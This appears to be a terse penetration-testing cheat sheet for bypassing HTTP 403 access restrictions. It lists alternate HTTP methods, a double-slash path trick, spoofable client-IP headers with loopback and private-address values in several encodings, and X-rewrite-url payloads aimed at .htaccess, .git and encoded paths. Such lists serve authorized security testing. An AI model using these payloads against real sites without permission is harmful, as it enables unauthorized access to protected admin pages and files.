# 403 Bypass

## Change method

* POST&#x20;
* PUT&#x20;
* TRACE&#x20;
* OPTIONS
* PATCH

```
slash: // -> https://example.com/admin//
```

## Header



```
X-Custom-IP-Authorization
X-Forwarded-For
X-Forward-For
X-Remote-IP
X-Originating-IP
X-Remote-Addr
X-Client-IP
X-Real-IP

values
localhost
localhost:80
localhost:443
127.0.0.1
127.0.0.1:80
127.0.0.1:443
2130706433
0x7F000001
0177.0000.0000.0001
0
127.1
10.0.0.0
10.0.0.1
172.16.0.0
172.16.0.1
192.168.1.0
192.168.1.1
```

Rewrite header

```
X-rewrite-url: 
values:
.htaccess
.git
%2f
%2e/js/
/*
/./
./.
/*/
```
